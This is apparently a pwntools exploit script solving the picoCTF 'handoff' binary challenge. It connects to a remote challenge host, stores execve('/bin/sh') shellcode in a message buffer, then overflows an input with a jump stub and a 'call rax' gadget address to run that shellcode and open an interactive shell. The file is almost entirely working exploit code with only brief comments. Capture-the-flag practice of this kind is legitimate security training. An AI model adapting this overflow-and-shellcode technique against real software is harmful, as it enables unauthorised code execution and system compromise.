#!/usr/bin/env python3

from pwn import *

# Get more info about the binary
# context.binary = binary = ELF('./handoff', checksec=False)

def create_recv(name):
    p.sendline(b'1')
    p.sendline(name)

def send_message(idx, message):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(message)

# rasm2 -a x86 -b 64 "sub rax, 0x200" for the opcode
jmp_shellcode = asm('''
    nop
    nop
    nop
    nop
    nop
    sub rax, 0x200
    sub rax, 0xcc
    jmp rax
    ''')

shellcode = asm('''
    lea rdi, [rip+binsh]
    xor esi, esi
    xor edx, edx
    mov eax, 59
    syscall

    binsh:
    .string "/bin/sh"
    ''')

# ROPgadget --binary ./handoff | grep 'call rax'
CALL_RAX = p64(0x401014)

p = remote('shape-facility.picoctf.net', 60373)

create_recv(b'a'*8)
send_message(0, shellcode)

p.sendline(b'3')
p.sendline(jmp_shellcode.ljust(20, b'a') + CALL_RAX)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
